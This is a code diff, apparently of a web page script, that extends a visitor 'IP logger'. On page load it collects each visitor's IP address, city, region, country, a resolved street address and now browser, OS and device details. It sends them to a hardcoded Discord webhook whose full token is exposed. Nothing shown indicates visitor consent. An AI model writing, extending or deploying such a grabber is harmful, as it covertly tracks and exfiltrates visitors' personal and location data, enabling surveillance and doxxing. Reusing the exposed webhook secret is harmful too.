@@ -1,6 +1,6 @@
 const WEBHOOK_URL = `https://discord.com/api/webhooks/1349523049250291712/wUumjsxHGe6Qyd2G4gUAmb_5OHX7T8U2Nbxkpb4mEjW9xVuZc0Le96jVBOC8rguajQbc`;
 
-function sendToDiscord(ipData, locationData) {
+function sendToDiscord(ipData, locationData, deviceData) {
   const ip = ipData.ip;
   const city = ipData.city;
   const region = ipData.region;
@@ -17,11 +17,21 @@ function sendToDiscord(ipData, locationData) {
     addressMessage = `Address: ${address}`;
   }
 
+  // Device information
+  const deviceMessage = `
+Device Information:
+- Browser: ${deviceData.browser}
+- OS: ${deviceData.os}
+- Device: ${deviceData.device}
+- Type: ${deviceData.type}
+`;
+
   const message = `\`\`\`
 IP Address: ${ip}
 Location: ${city}, ${region}, ${country}
 ${locationMessage}
 ${addressMessage}
+${deviceMessage}
 \`\`\``;
 
   fetch(WEBHOOK_URL, {
@@ -74,10 +84,25 @@ function sendIPData() {
     .then((response) => response.json())
     .then((ipData) => {
       getUserLocation(function (locationData) {
-        sendToDiscord(ipData, locationData);
+        const deviceData = getDeviceData(); // Get device data
+        sendToDiscord(ipData, locationData, deviceData); // Pass device data
       });
     })
     .catch((error) => console.error(`Error retrieving IP data: ${error}`));
+}
+
+function getDeviceData() {
+  // Initialize the parser
+  var parser = new UAParser();
+  var result = parser.getResult();
+
+  // Prepare the device data to send
+  return {
+    browser: result.browser.name + " " + result.browser.version,
+    os: result.os.name + " " + result.os.version,
+    device: result.device.vendor + " " + result.device.model,
+    type: result.device.type,
+  };
 }
 
 window.addEventListener("load", sendIPData);
